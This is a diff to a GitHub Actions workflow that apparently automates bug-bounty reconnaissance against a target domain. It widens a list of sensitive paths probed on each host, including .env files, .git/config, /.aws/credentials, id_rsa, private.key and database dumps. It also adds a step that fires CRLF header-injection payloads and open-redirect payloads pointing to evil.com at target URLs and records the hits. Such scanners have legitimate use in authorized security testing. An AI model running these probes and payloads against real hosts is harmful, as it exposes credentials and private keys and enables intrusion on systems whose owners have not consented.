@@ -159,13 +159,28 @@ print('Confirmed takeovers:', len(results))
         run: |
           D="$DOMAIN"
           PATHS=(
-            "/.env" "/.env.local" "/.env.production"
-            "/.git/config" "/.git/HEAD"
-            "/config.json" "/config.yaml" "/phpinfo.php"
+            "/.env" "/.env.local" "/.env.production" "/.env.staging"
+            "/.env.backup" "/.env.bak" "/.env.old"
+            "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG"
+            "/config.json" "/config.yaml" "/config.yml" "/config.php"
+            "/database.yml" "/database.json" "/settings.py"
+            "/phpinfo.php" "/info.php" "/test.php"
             "/server-status" "/server-info"
-            "/swagger.json" "/openapi.json" "/v2/api-docs"
-            "/actuator/env" "/actuator/health" "/actuator/mappings"
-            "/.htpasswd" "/dump.sql" "/backup.zip"
+            "/swagger.json" "/openapi.json" "/swagger.yaml"
+            "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
+            "/api/swagger.json" "/api-docs"
+            "/actuator" "/actuator/env" "/actuator/health"
+            "/actuator/mappings" "/actuator/beans" "/actuator/configprops"
+            "/.htpasswd" "/.htaccess"
+            "/dump.sql" "/backup.zip" "/backup.tar.gz" "/backup.sql"
+            "/wp-config.php" "/wp-config.php.bak"
+            "/composer.json" "/package.json" "/yarn.lock"
+            "/Dockerfile" "/docker-compose.yml"
+            "/.aws/credentials" "/credentials.json" "/service-account.json"
+            "/.npmrc" "/private.key" "/id_rsa"
+            "/CHANGELOG.md" "/README.md" "/.gitignore"
+            "/crossdomain.xml" "/clientaccesspolicy.xml"
+            "/.travis.yml" "/Jenkinsfile"
           )
 
           while IFS= read -r host; do
@@ -236,6 +251,36 @@ print('Confirmed takeovers:', len(results))
               fi
             done
           done
+
+      - name: CRLF Injection + Open Redirect
+        continue-on-error: true
+        run: |
+          D="$DOMAIN"
+          mkdir -p /tmp/hunt/$D/findings
+
+          # CRLF Injection
+          CRLF_PAYLOADS=("%0d%0aX-Injected:crlf" "%0aX-Injected:crlf" "%0d%0aSet-Cookie:crlftest=1")
+          head -10 /tmp/hunt/$D/urls/targets.txt | while IFS= read -r host; do
+            [ -z "$host" ] && continue
+            for payload in "${CRLF_PAYLOADS[@]}"; do
+              resp=$(curl -sk -I --max-time 5 "${host}/${payload}" 2>/dev/null || echo "")
+              if echo "$resp" | grep -qi "x-injected:crlf\|crlftest=1"; then
+                echo "[CRLF] $host | $payload"                   >> /tmp/hunt/$D/findings/crlf.txt
+              fi
+            done
+          done
+
+          # Open Redirect
+          grep -iE '[?&](url|redirect|next|return|goto|target|dest|destination|redir|redirect_uri|callback|continue|forward|location|link|out|view|logoutUrl|image_url|go)='             /tmp/hunt/$D/urls/clean.txt 2>/dev/null             | sort -u | head -30 | while IFS= read -r url; do
+              test_url=$(echo "$url" | sed 's|=.*&|=https://evil.com\&|g; s|=.*$|=https://evil.com|')
+              location=$(curl -sk -o /dev/null -w "%{redirect_url}"                 --max-time 5 "$test_url" 2>/dev/null || echo "")
+              if echo "$location" | grep -q "evil.com"; then
+                echo "[OPEN-REDIRECT] $url => $location"                   >> /tmp/hunt/$D/findings/open_redirect.txt
+              fi
+            done
+
+          echo "CRLF: $(wc -l < /tmp/hunt/$D/findings/crlf.txt 2>/dev/null || echo 0)"
+          echo "Open Redirect: $(wc -l < /tmp/hunt/$D/findings/open_redirect.txt 2>/dev/null || echo 0)"
 
       - name: Discord Notification
         if: always()
